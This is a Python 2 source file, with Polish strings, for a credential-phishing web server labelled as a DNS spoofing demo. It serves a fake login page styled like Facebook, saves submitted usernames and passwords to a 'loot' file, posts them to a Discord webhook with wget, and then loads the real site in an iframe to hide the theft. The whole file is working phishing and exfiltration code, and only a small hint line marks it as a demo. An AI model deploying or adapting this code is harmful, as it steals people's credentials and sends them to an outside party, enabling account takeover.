#!/usr/bin/env python
# Phishing server for DNS Spoofing demo (Python 2, MK1)

import BaseHTTPServer
import urlparse
import os
import subprocess
from datetime import datetime

LOOT_DIR = "/mnt/loot"
LOOT_FILE = os.path.join(LOOT_DIR, "stolen_credentials.txt")
REDIRECT_URL = "http://34.231.103.8"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/TWOJ_WEBHOOK_URL"


def send_discord_webhook(username, password, timestamp):
    msg = "%s | %s | %s" % (timestamp, username, password)
    tmpfile = "/tmp/discord_webhook.json"
    try:
        with open(tmpfile, "w") as f:
            f.write('{"content": "%s"}' % msg)
        subprocess.call([
            "wget", "-q", "--no-check-certificate",
            "--header=Content-Type: application/json",
            "--post-file=" + tmpfile,
            DISCORD_WEBHOOK_URL, "-O", "/dev/null"
        ])
    except Exception as e:
        print("[!] Blad webhooka: %s" % e)


def get_phishing_page():
    return """
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Zaloguj sie</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 400px;
            text-align: center;
        }
        .login-box h1 { color: #333; font-size: 28px; margin-bottom: 20px; }
        .login-box input {
            width: 100%; padding: 14px 16px; margin: 6px 0;
            border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px;
        }
        .login-box button {
            width: 100%; padding: 14px; background: #1877f2;
            color: white; border: none; border-radius: 6px;
            font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px;
        }
        .login-box button:hover { background: #166fe5; }
        .hint { font-size: 12px; color: #999; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Zaloguj sie</h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Adres email lub nazwa uzytkownika" required>
            <input type="password" name="password" placeholder="Haslo" required>
            <button type="submit">Zaloguj sie</button>
        </form>
        <p class="hint">Demonstracja DNS spoofing</p>
    </div>
</body>
</html>
"""


class PhishingHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        try:
            with open(os.path.join(LOOT_DIR, "phishing_access.log"), "a") as f:
                f.write("%s - %s\n" % (self.client_address[0], format % args))
        except IOError:
            pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(get_phishing_page())

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)
        params = urlparse.parse_qs(post_data)

        username = params.get("username", ["[nieznany]"])[0]
        password = params.get("password", ["[nieznany]"])[0]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            with open(LOOT_FILE, "a") as f:
                f.write("[%s] Login: %s | Haslo: %s\n" % (timestamp, username, password))
                f.write("-" * 60 + "\n")
        except IOError:
            pass

        print("\n[!] SKRADZIONE DANE:")
        print("    Login: %s" % username)
        print("    Haslo: %s" % password)
        print("    Czas:  %s\n" % timestamp)

        send_discord_webhook(username, password, timestamp)

        print("[*] iframe: %s" % REDIRECT_URL)
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write("""
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Przekierowanie...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #fff; }
        iframe { width: 100vw; height: 100vh; border: none; }
    </style>
</head>
<body>
    <iframe src="%s"></iframe>
</body>
</html>
""" % REDIRECT_URL)


def main():
    if not os.path.exists(LOOT_DIR):
        os.makedirs(LOOT_DIR)

    print("[*] Serwer phishingowy na porcie 80")
    print("[*] Oczekiwanie na ofiary...")

    server = BaseHTTPServer.HTTPServer(("0.0.0.0", 80), PhishingHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Serwer zatrzymany.")
        server.server_close()


if __name__ == "__main__":
    main()
